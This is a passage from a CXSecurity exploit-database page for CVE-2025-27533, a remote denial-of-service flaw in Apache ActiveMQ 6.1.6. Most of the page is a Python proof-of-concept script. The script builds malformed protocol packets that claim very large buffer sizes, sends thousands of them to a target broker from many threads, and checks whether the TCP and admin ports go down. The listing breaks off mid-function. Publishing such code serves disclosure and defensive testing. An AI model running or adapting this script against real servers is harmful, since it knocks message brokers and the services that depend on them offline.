---
title: Apache ActiveMQ 6.1.6 Denial of Service
url: https://cxsecurity.com/issue/WLB-2025050023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-10
fetch_date: 2025-10-06T22:26:35.559731
---

# Apache ActiveMQ 6.1.6 Denial of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache ActiveMQ 6.1.6 Denial of Service** **2025.05.09**  Credit:  **[Abdualhadi khalifa](https://cxsecurity.com/author/Abdualhadi%2Bkhalifa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-27533](https://cxsecurity.com/cveshow/CVE-2025-27533/ "Click to see CVE-2025-27533")**  CWE: **N/A** | |

# Exploit Title: Apache ActiveMQ 6.1.6 - Denial of Service (DOS)
# Date: 2025-05-9
# Exploit Author: [Abdualhadi khalifa (https://x.com/absholi7ly/)
# Github: https://github.com/absholi7ly/CVE-2025-27533-Exploit-for-Apache-ActiveMQ
# CVE: CVE-2025-27533
import socket
import struct
import time
import datetime
import threading
import requests
import argparse
import random
from colorama import init, Fore
from tabulate import tabulate
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
init()
def print\_banner():
banner = f"""
{Fore.CYAN}============================================================
CVE-2025-27533 Exploit PoC - Apache ActiveMQ DoS
============================================================
{Fore.YELLOW}Developed by: absholi7ly
{Fore.CYAN}============================================================{Fore.RESET}
"""
print(banner)
def \_check\_server\_availability(host, port, admin\_port=8161, timeout=2):
"""Internal function to check server availability"""
tcp\_reachable = False
admin\_reachable = False
try:
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.settimeout(timeout)
sock.connect((host, port))
sock.close()
tcp\_reachable = True
except (socket.timeout, ConnectionRefusedError):
pass
try:
response = requests.get(f"http://{host}:{admin\_port}/admin", timeout=timeout)
admin\_reachable = response.status\_code == 200
except (requests.Timeout, requests.ConnectionError):
pass
return tcp\_reachable, admin\_reachable
def check\_server\_availability(host, port, admin\_port=8161, timeout=2, retries=5):
for \_ in range(retries):
tcp\_reachable, admin\_reachable = \_check\_server\_availability(host, port, admin\_port, timeout)
if not tcp\_reachable:
return False, admin\_reachable
time.sleep(0.5)
return True, admin\_reachable
def parse\_hex\_or\_int(value):
try:
if value.startswith('0x') or value.startswith('0X'):
return int(value, 16)
return int(value)
except ValueError:
raise ValueError(f"Invalid integer or hex value: {value}")
def create\_malicious\_packet(buffer\_size=0x1E00000, packet\_id=1):
command\_type = 0x01
client\_id = f"EXPLOIT-PACKET-{packet\_id:04d}".encode()
version = 12
packet = bytearray()
packet += b'\x00\x00\x00\x00'
packet += struct.pack("B", command\_type)
packet += struct.pack(">I", len(client\_id))
packet += client\_id
packet += struct.pack(">I", version)
packet += struct.pack(">I", buffer\_size)
packet += bytes(random.randint(0, 255) for \_ in range(50))
packet\_length = len(packet) - 4
packet[0:4] = struct.pack(">I", packet\_length)
return packet
def send\_single\_packet(host, port, packet, packet\_num, total\_packets, buffer\_size, packet\_status, stop\_event):
if stop\_event.is\_set():
return
timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
tcp\_reachable, admin\_reachable = check\_server\_availability(host, port)
status = f"TCP: {'Up' if tcp\_reachable else 'Down'}, Admin: {'Up' if admin\_reachable else 'Down'}"
local\_port = "N/A"
connection\_status = "Success"
max\_connect\_retries = 5
for connect\_attempt in range(max\_connect\_retries):
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.settimeout(5)
sock.setsockopt(socket.SOL\_SOCKET, socket.SO\_RCVBUF, 1024 \* 1024)
sock.setsockopt(socket.SOL\_SOCKET, socket.SO\_SNDBUF, 1024 \* 1024)
sock.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
sock.setsockopt(socket.IPPROTO\_TCP, socket.TCP\_NODELAY, 1)
try:
sock.connect((host, port))
local\_port = sock.getsockname()[1]
print(f"{Fore.GREEN}[+] Connected to {host}:{port} (Packet {packet\_num}/{total\_packets}, Port: {local\_port}, Buffer: {buffer\_size // (1024\*1024)} MB){Fore.RESET}")
max\_retries = 3
for attempt in range(max\_retries):
try:
sock.send(packet)
print(f"{Fore.CYAN}[\*] Sent Packet {packet\_num}/{total\_packets} (Port: {local\_port}, Buffer: {buffer\_size // (1024\*1024)} MB){Fore.RESET}")
try:
response = sock.recv(2048)
response\_len = len(response)
connection\_status = f"Success (Response: {response\_len} bytes)"
except:
connection\_status = "Success (No Response)"
break
except socket.error as e:
connection\_status = f"Failed: {str(e)}"
if attempt < max\_retries - 1:
print(f"{Fore.YELLOW}[-] Failed to send Packet {packet\_num}/{total\_packets} (Attempt {attempt+1}, Port: {local\_port}): {e}. Retrying...{Fore.RESET}")
time.sleep(0.5)
continue
else:
print(f"{Fore.RED}[-] Failed to send Packet {packet\_num}/{total\_packets} after {max\_retries} attempts: {e}{Fore.RESET}")
packet\_status.append([packet\_num, timestamp, status, local\_port, f"Packet-{packet\_num:04d}", connection\_status])
break
except socket.timeout:
print(f"{Fore.RED}[-] Connection timeout for Packet {packet\_num}/{total\_packets} (Port: {local\_port}){Fore.RESET}")
packet\_status.append([packet\_num, timestamp, "Connection Timeout", local\_port, f"Packet-{packet\_num:04d}", "Timeout"])
break
except socket.error as e:
error\_str = str(e)
if "10053" in error\_str:
error\_type = "Connection Reset"
elif "timeout" in error\_str:
error\_type = "Timeout"
else:
error\_type = "Other"
if "10053" in error\_str and connect\_attempt < max\_connect\_retries - 1:
print(f"{Fore.YELLOW}[-] [WinError 10053] for Packet {packet\_num}/{total\_packets} (Attempt {connect\_attempt+1}): {e}. Retrying connection...{Fore.RESET}")
time.sleep(1)
continue
print(f"{Fore.RED}[-] Error connecting for Packet {packet\_num}/{total\_packets} (Port: {local\_port}): {e}{Fore.RESET}")
packet\_status.append([packet\_num, timestamp, f"Error: {error\_type}", local\_port, f"Packet-{packet\_num:04d}", f"Error: {error\_str}"])
break
finally:
sock.close()
packet = None
def send\_packets(host, port, total\_packets=2000, buffer\_sizes=[0x1E00000, 0x3200000]):
packet\_status = []
stop\_event = threading.Event()
max\_thread...